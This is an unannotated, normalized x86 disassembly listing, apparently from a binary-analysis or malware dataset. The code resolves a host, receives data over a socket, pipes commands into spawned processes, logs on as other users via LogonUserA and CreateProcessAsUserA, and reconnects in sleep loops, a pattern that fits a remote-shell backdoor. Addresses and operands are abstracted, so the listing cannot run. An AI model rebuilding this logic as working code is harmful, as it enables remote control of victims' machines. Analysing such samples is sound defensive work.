cmp [ ebp - 0x470c ] 0x0
je r-xdata
int3
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x2504 ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp - 0x2504 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4700 ]
call sub_71001800
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4700 ]
call sub_71001800
jmp r-xdata
jmp r-xdata
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call closesocket
xor eax eax
mov [ ebp - 0x25e4 ] eax
mov [ ebp - 0x25e0 ] eax
mov [ ebp - 0x25dc ] eax
mov [ ebp - 0x25d8 ] eax
mov [ ebp - 0x25d4 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
push ecx
push rw-data
lea ecx [ ebp - 0x25e4 ]
push ecx
call [ strncpy@IAT ]
add esp 0xc
lea edx [ ebp - 0x25e4 ]
push edx
call [ atof@IAT ]
add esp 0x4
fmul [ r--data ]
call _ftol
push rw-data
call sub_71005420
add esp 0x4
lea eax [ ebp - 0x24f4 ]
push eax
mov ecx [ rw-data ]
push ecx
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x0
mov ecx [ rw-data ]
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x23f0 ] ecx
push 0x0
push 0x0
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call sub_71001000
mov [ ebp - 0x1c ] rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov [ ebp - 0x4718 ] 0x0
cmp [ ebp - 0x2500 ] 0x0
je r-xdata
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call sub_71004f8a
add [ edi + rw-data ] bh
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4710 ] 0x103
je r-xdata
je r-xdata
jmp r-xdata
mov edx [ rw-data ]
push edx
push rw-data
call sub_71001fe0
add esp 0x8
mov eax rw-data
mov ecx rw-data
mov edx [ ecx ]
cmp edx [ eax ]
je r-xdata
push 0x0
push 0x2000
push rw-data
mov edx [ rw-data ]
push edx
call recv
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jge r-xdata
call sub_71005c90
push rw-data
call gethostbyname
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71006ae0
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x2500 ] eax
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x4718 ]
push ecx
mov edx [ ebp - 0x2500 ]
push edx
call [ GetExitCodeThread@IAT ]
mov [ ebp - 0x4714 ] eax
cmp [ ebp - 0x4714 ] 0x0
je r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ ebp - 0x23ec ]
push edx
call [ CloseHandle@IAT ]
mov [ ebp - 0x23ec ] 0x0
jmp r-xdata
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jne r-xdata
push eax
call [ Sleep@IAT ]
jmp r-xdata
dec esp
add [ eax ] al
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push 0x0
push sub_71004b80
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call inet_ntoa
mov [ ebp - 0x24 ] eax
mov ecx 0xc
xor eax eax
mov edi rw-data
[ edi ]
stosw [ edi ]
mov edi [ ebp - 0x24 ]
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
push 0x927c0
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
cmp [ ebp - 0x4718 ] 0x103
je r-xdata
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x2500 ]
push eax
call [ CloseHandle@IAT ]
mov [ ebp - 0x2500 ] 0x0
jmp r-xdata
jne r-xdata
push 0x0
lea edx [ ebp - 0x3d4 ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
int3
mov edx rw-data
mov eax rw-data
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
je r-xdata
push 0x0
lea edx [ ebp - 0x3d4 ]
push edx
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
jb r-xdata
mov [ ebp - 0x26b4 ] 0x0
mov [ ebp - 0x26ac ] 0x0
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x26a0 ]
[ edi ]
lea edx [ ebp - 0x26a0 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x26a0 ] 0x44
mov [ ebp - 0x2674 ] 0x101
mov [ ebp - 0x2670 ] 0x0
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x2650 ] eax
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26b0 ] eax
push 0x14
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26a8 ] eax
push 0x32
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x264c ] eax
push 0x64
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x2654 ] eax
xor eax eax
mov ecx [ ebp - 0x2650 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
xor edx edx
mov eax [ ebp - 0x26b0 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
xor ecx ecx
mov edx [ ebp - 0x26a8 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0xc
xor eax eax
mov edi [ ebp - 0x264c ]
[ edi ]
stosw [ edi ]
mov ecx 0x19
xor eax eax
mov edi [ ebp - 0x2654 ]
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffb
push ecx
push rw-data
mov eax [ ebp - 0x2654 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
mov [ ebp - 0x23f0 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx 0x11
xor eax eax
lea edi [ ebp - 0x2638 ]
[ edi ]
lea edx [ ebp - 0x2638 ]
push edx
call [ GetStartupInfoA@IAT ]
mov [ ebp - 0x2638 ] 0x44
mov [ ebp - 0x260c ] 0x101
mov [ ebp - 0x2608 ] 0x0
mov eax [ rw-data ]
mov [ ebp - 0x25f8 ] eax
mov ecx [ rw-data ]
mov [ ebp - 0x2600 ] ecx
mov edx [ rw-data ]
mov [ ebp - 0x25fc ] edx
lea eax [ ebp - 0x25f4 ]
push eax
lea ecx [ ebp - 0x2638 ]
push ecx
push 0x0
push 0x0
push 0x10
push 0x1
push 0x0
push 0x0
mov edx [ ebp - 0x1c ]
push edx
push 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x7
mov edi rw-data
jae r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x23f0 ] ecx
jge r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push 0x0
push sub_71005200
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ CloseHandle@IAT ]
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
clc
nop
jae r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
call sub_710042bf
add [ edi + rw-data ] bh
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x2658 ] ecx
jmp r-xdata
mov edx [ ebp - 0x2654 ]
add edx [ ebp - 0x23f0 ]
movsx eax [ edx ]
cmp eax 0x2d
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
call 0x7103f813
add [ eax ] al
mov [ ebp - 0x26b8 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
inc ecx
push ecx
call [ malloc@IAT ]
add esp 0x4
mov [ ebp - 0x26b8 ] eax
cmp [ ebp - 0x26b8 ] 0x0
je r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x2658 ] ecx
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x2650 ]
add ecx [ ebp - 0x23f0 ]
mov edx [ ebp - 0x2654 ]
add edx [ ebp - 0x23f0 ]
mov al [ edx ]
mov [ ecx ] al
jmp r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
jle r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
inc ecx
xor eax eax
mov edi [ ebp - 0x26b8 ]
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff7
push ecx
push rw-data
mov eax [ ebp - 0x26b8 ]
push eax
call [ strncpy@IAT ]
add esp 0xc
cmp [ ebp - 0x3e8 ] 0x1
jne r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x2658 ]
add ecx 0x1
mov [ ebp - 0x265c ] ecx
jmp r-xdata
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x2658 ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
jmp r-xdata
mov ecx 0x2
mov edi rw-data
jg r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x26b8 ]
push eax
call sub_71005420
add esp 0x4
and eax 0xff
test eax eax
jne r-xdata
mov edi rw-data
mov edx [ ebp - 0x26b8 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
add edi 0xffffffff
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x265c ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x2658 ]
sub edx [ ebp - 0x23f0 ]
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x2658 ]
mov ecx [ ebp - 0x26b0 ]
mov al [ eax ]
mov [ ecx + edx - 0x1 ] al
jmp r-xdata
mov ecx [ ebp - 0x23f0 ]
add ecx 0x1
mov [ ebp - 0x23f0 ] ecx
lea eax [ ebp - 0x250c ]
push eax
push 0x0
push rw-data
push sub_71005450
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
je r-xdata
call sub_710041ce
add [ edi + rw-data ] bh
mov edx rw-data
mov eax [ ebp - 0x26b8 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx [ ebp - 0x265c ]
add ecx 0x1
mov [ ebp - 0x26a4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x265c ]
movsx ecx [ eax ]
cmp ecx 0x2d
je r-xdata
jmp r-xdata
mov ecx 0xb
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov edx [ ebp - 0x26b8 ]
push edx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x26b8 ] 0x0
mov [ rw-data ] 0x0
push 0x0
mov edx [ ebp - 0x28 ]
push edx
call [ TerminateThread@IAT ]
mov [ ebp - 0x28 ] 0x0
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edi [ ebp - 0x2654 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
cmp [ ebp - 0x26a4 ] ecx
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x265c ]
sub edx [ ebp - 0x2658 ]
mov eax [ ebp - 0x2654 ]
add eax [ ebp - 0x265c ]
mov ecx [ ebp - 0x26a8 ]
mov al [ eax ]
mov [ ecx + edx - 0x1 ] al
jmp r-xdata
mov edx [ ebp - 0x2658 ]
add edx 0x1
mov [ ebp - 0x2658 ] edx
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
mov edx rw-data
mov eax [ ebp - 0x26a8 ]
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov eax [ ebp - 0x26a4 ]
sub eax [ ebp - 0x265c ]
mov ecx [ ebp - 0x2654 ]
add ecx [ ebp - 0x26a4 ]
mov edx [ ebp - 0x264c ]
mov cl [ ecx ]
mov [ edx + eax - 0x1 ] cl
jmp r-xdata
jmp r-xdata
mov ecx 0x4
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov ecx rw-data
mov edx [ ebp - 0x26b0 ]
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x26a8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0x26a4 ]
add edx 0x1
mov [ ebp - 0x26a4 ] edx
mov edx [ ebp - 0x265c ]
add edx 0x1
mov [ ebp - 0x265c ] edx
mov ecx 0x17
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
mov [ ebp - 0x26bc ] 0x0
xor eax eax
mov [ ebp - 0x26d0 ] eax
mov [ ebp - 0x26cc ] eax
mov [ ebp - 0x26c8 ] eax
mov [ ebp - 0x26c4 ] eax
mov [ ebp - 0x26c0 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffe9
mov esi rw-data
lea edi [ ebp - 0x26d0 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x26d0 ]
push eax
call [ _atoi64@IAT ]
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea eax [ ebp - 0x26b4 ]
push eax
push 0x0
push 0x2
mov ecx [ ebp - 0x26b0 ]
push ecx
mov edx [ ebp - 0x26a8 ]
push edx
mov eax [ ebp - 0x2650 ]
push eax
call [ LogonUserA@IAT ]
mov [ ebp - 0x26ac ] eax
mov ecx [ ebp - 0x2650 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov edx [ ebp - 0x26b0 ]
push edx
call [ free@IAT ]
add esp 0x4
mov eax [ ebp - 0x26a8 ]
push eax
call [ free@IAT ]
add esp 0x4
mov ecx [ ebp - 0x2654 ]
push ecx
call [ free@IAT ]
add esp 0x4
mov [ ebp - 0x2650 ] 0x0
mov [ ebp - 0x26b0 ] 0x0
mov [ ebp - 0x26a8 ] 0x0
mov [ ebp - 0x2654 ] 0x0
cmp [ ebp - 0x26ac ] 0x0
jne r-xdata
xor ecx ecx
mov edx [ ebp - 0x26b0 ]
mov [ edx ] ecx
mov [ edx + 0x4 ] ecx
mov [ edx + 0x8 ] ecx
mov [ edx + 0xc ] ecx
mov [ edx + 0x10 ] ecx
mov ecx 0x5
mov edi rw-data
mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0xffffffff
lea edx [ ebp - 0x2648 ]
push edx
lea eax [ ebp - 0x26a0 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264c ]
push ecx
push 0x0
mov edx [ ebp - 0x26b4 ]
push edx
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ ebp - 0x26d4 ] 0x0
xor ecx ecx
mov [ ebp - 0x26e8 ] ecx
mov [ ebp - 0x26e4 ] ecx
mov [ ebp - 0x26e0 ] ecx
mov [ ebp - 0x26dc ] ecx
mov [ ebp - 0x26d8 ] ecx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffe5
mov esi rw-data
lea edi [ ebp - 0x26e8 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ ebp - 0x26e8 ]
push eax
call [ _atoi64@IAT ]
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
mov edi rw-data
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
nop
nop
nop
mov ecx 0x5
mov edi rw-data
